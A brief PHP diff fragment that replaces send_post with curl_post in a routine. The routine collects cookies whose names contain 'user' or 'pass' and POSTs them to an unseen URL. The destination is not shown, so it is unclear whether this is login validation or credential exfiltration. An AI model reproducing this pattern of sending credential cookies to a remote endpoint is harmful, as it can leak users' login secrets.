@@ -16,7 +16,7 @@ $cookies = array();
 foreach($_COOKIE as $ckey => $cval){
 	if(strpos($ckey,'user')!==false || strpos($ckey,'pass')!==false) $cookies[$ckey] = $cval;
 }
-$validinfo = send_post($url, $context, $cookies);
+$validinfo = curl_post($url, $context, $cookies);
 if(strpos($validinfo,'<head>')===false){
 	$d_validinfo = gdecode($validinfo,1);
 	if(is_array($d_validinfo) && isset($d_validinfo['url']) && 'error.php' == $d_validinfo['url']){
